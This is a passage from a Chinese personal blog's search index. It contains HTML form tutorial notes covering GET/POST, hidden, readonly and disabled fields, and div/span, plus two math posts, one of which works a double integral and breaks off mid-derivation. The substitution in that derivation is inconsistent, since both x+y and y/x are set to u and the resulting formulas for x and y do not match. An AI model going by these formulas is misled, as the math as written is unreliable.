class="comment">没有name时不会提交的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;百度&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:\\localhost:8080/jd/login&quot;</span>&gt;</span></span><br><span class="line">用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">表单时以什么格式提交给服务器的？</span></span><br><span class="line"><span class="comment">http://localhost:8080/jd/login?username=abc&amp;pwd=111</span></span><br><span class="line"><span class="comment">格式:action?name=value&amp;name=value&amp;name=value</span></span><br><span class="line"><span class="comment">HTTP协议规定的，必须以这种格式提交给服务器 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">重点，表单写了name属性的，一律会提交给服务器。</span></span><br><span class="line"><span class="comment">name为空好像也不提交，不知道是交了没有</span></span><br><span class="line"><span class="comment">在测试时并不会多了&amp;</span></span><br><span class="line"><span class="comment">value没有写的时候，value的默认值是空字符串，java代码得到的是 string = &quot;&quot;;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:\\localhost:8080/jd/login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>  /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--text类型value由用户写--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="用户注册表单"><a href="#用户注册表单" class="headerlink" title="用户注册表单"></a>用户注册表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>用户注册表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">用户注册:</span></span><br><span class="line"><span class="comment">用户名</span></span><br><span class="line"><span class="comment">密码</span></span><br><span class="line"><span class="comment">确认密码</span></span><br><span class="line"><span class="comment">性别</span></span><br><span class="line"><span class="comment">兴趣爱好</span></span><br><span class="line"><span class="comment">学历</span></span><br><span class="line"><span class="comment">简介</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">accept</span>=<span class="string">&quot;http://localhost:8080/jd/register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">form表单method属性</span></span><br><span class="line"><span class="comment">gets:用户提交的信息会显示在地址栏上</span></span><br><span class="line"><span class="comment">post:用户名提交的信息不会显示在浏览器地址栏上</span></span><br><span class="line"><span class="comment">当用户提交的信息含有敏感信息时建议用post方式提交</span></span><br><span class="line"><span class="comment">默认时gets方式，只有methon指定时post时才是post请求</span></span><br><span class="line"><span class="comment">两种方式提交的数据格式还是一样的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">用户名</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">确认密码 <span class="comment">&lt;!--确认密码不用发到服务器，JavaScript就可以解决--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">性别<span class="comment">&lt;!--name相同时只能选一个，name不同是可以都选--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--checked 默认选中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">checked</span> /&gt;</span>男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span>女</span><br><span class="line"><span class="comment">&lt;!--单选按钮的value必须手动指定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">兴趣爱好</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;basketball&quot;</span> /&gt;</span>打篮球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;football&quot;</span> <span class="attr">checked</span>  /&gt;</span>打足球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;volleyball&quot;</span> /&gt;</span>打排球</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">学历</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;grade&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;gz&quot;</span>&gt;</span>高中<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;dz&quot;</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;bk&quot;</span> <span class="attr">selected</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="comment">&lt;!--默认选中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ss&quot;</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">简介<span class="comment">&lt;!--文本域,没有value属性，填的就是value--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span> <span class="attr">name</span>=<span class="string">&quot;introduce&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--username=jackon&amp;userpwd=111&amp;gender=1&amp;interest=football&amp;grade=bk&amp;introduce=111--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接也可以提交数据给服务器，但提交的数据时固定的。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接时gets请求，不是post请求--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8080/jd/register?username=ctl&amp;password=111&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--http://localhost:8080/jd/register?username=ctl&amp;password=111</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/MKi9Y1QOwZTHuaJ.png" alt="用户注册表单.png"></p><h2 id="一些控件"><a href="#一些控件" class="headerlink" title="一些控件"></a>一些控件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>一些控件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下拉列表支持多选--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--multiple支持多选，但要按住CTRL--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--size控制显示的条数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>福建省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>江西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>山东省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>海南省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>陕西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文件上传专用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--隐藏域hidden 控件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/jd/save&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网页上看不到，但表单提交的时候数据会自动提交给服务器。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--userid=111&amp;usercode=--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">用户代码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;usercode&quot;</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--readonly和disabled--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--相同点:都是只读不能修改</span></span><br><span class="line"><span class="comment">不同点:readonly可以提交给服务器,disabled数据包不会提交(即使由name属性)</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/jd/save&quot;</span>&gt;</span></span><br><span class="line">用户代码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;usercode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span><span class="attr">readonly</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">用户姓名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> <span class="attr">disabled</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交数据&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--usercode=111--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--input控件的maxlength的属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置文本框中可输入字符的数量--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--提一提--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--HTML中元素的id属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、在HTML文档中，任何元素（节点）都有id属性</span></span><br><span class="line"><span class="comment">2、id属性时该节点的唯一标识，所以在同一个HTML文档中id值不能重复</span></span><br><span class="line"><span class="comment">3、id有什么用?</span></span><br><span class="line"><span class="comment">a.id是为了让我们更方便的获取这个元素</span></span><br><span class="line"><span class="comment">b.JavaScript可以对HTML文档中任意节点进行增删改操作，那么增删改之前需要先拿到这个节点，通常我们通过id来拿节点对象</span></span><br><span class="line"><span class="comment">4、THML文档是一棵树，树上有很多节点，每一个节点有唯一的id</span></span><br><span class="line"><span class="comment">  (DOM树)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://smms.app/image/KYOs57H8RPvpTUaS&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s2.loli.net/2023/03/05/KYO57H8RPvpTUaS.png&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span>&gt;</span>DOM树<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;userpwd&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--id就是节点的身份证号，不能重复.--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表单提交数据的时候只和name有关和id无关--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/j4AhuTDvOSVIlbQ.png" alt="122.png"></p><h2 id="div和span"><a href="#div和span" class="headerlink" title="div和span"></a>div和span</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML中的div和span<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、div和span有什么用？？</span></span><br><span class="line"><span class="comment">div和span都可以称为“图层”</span></span><br><span class="line"><span class="comment">div和span时可以定位的，只要顶下dic的左上角的x轴和y轴坐标即可</span></span><br><span class="line"><span class="comment">2、图层有什么用？</span></span><br><span class="line"><span class="comment">保证页面可以灵活的布局</span></span><br><span class="line"><span class="comment">3、最早的网页使用table布局，但是table不灵活，太死板</span></span><br><span class="line"><span class="comment">现代网页开发div布局使用最多，几乎很少使用table进行布局</span></span><br><span class="line"><span class="comment">4、div和span的区别？</span></span><br><span class="line"><span class="comment">默认情况下div会占用一行，span不会占用一行</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>我是一个div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>我是一个div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;span1&quot;</span>&gt;</span>我是一个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;span2&quot;</span>&gt;</span>我是一个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/GDiRjskFudHpvTM.png" alt="11.png"></p><h1 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h1>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道积分笔记</title>
      <link href="/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/10/16/oQcA3TLsHYMVnkb.png" alt="MommyTalk1665933979433.png"><br><strong>忘记加绝对值</strong></p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇思妙想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="以一道数学题开始我的发文"><a href="#以一道数学题开始我的发文" class="headerlink" title="以一道数学题开始我的发文"></a>以一道数学题开始我的发文</h1><p><font size=4>废话不多说，直接上题</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_D&space;\frac{(x&plus;y)&space;\ln&space;\left(1&plus;\frac{y}{x}\right)}{\sqrt{1-x-y}}&space;\mathrm{d}&space;x&space;\mathrm{d}&space;y" title="https://latex.codecogs.com/svg.image?\iint_D \frac{(x+y) \ln \left(1+\frac{y}{x}\right)}{\sqrt{1-x-y}} \mathrm{d} x \mathrm{d} y" /> </div>&emsp; 其中区域D由直线x + y = 1 与两坐标轴所围成得三角形区域。<p><strong>解:</strong><br>　　这题的式子较为复杂，直接求解可能计算量偏大，进而考虑其它方法，首先考虑换元法.<br>　　不妨设：</p><div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x&plus;y=u&space;\\\frac{y}{x}=u\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x+y=u \\\frac{y}{x}=u\end{array}\right." /> </div>　　解，得：<div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1&plus;u}&space;\\y=\frac{u&space;v}{1&plus;v}\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1+u} \\y=\frac{u v}{1+v}\end{array}\right." /> </div>　　因为由x, y 